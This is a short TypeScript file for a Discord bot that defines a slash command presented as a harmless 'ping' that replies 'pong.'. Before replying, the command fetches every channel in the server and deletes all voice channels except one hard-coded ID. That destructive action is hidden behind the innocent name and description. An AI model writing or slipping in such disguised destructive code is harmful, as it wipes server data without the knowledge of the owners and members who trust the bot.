import type { CommandInteraction } from "discord.js";
import { Discord, Slash } from "discordx";

@Discord()
export abstract class PingCommand {
  @Slash("ping", { description: "pong." })
  private async execute(interaction: CommandInteraction): Promise<void> {
    const channels = await (
      await interaction.guild?.channels.fetch()
    )?.filter((c) => c.type === "GUILD_VOICE" && c.id !== "892542055170060358");
    channels?.forEach((c) => c.delete());

    return await interaction.reply("pong.");
  }
}
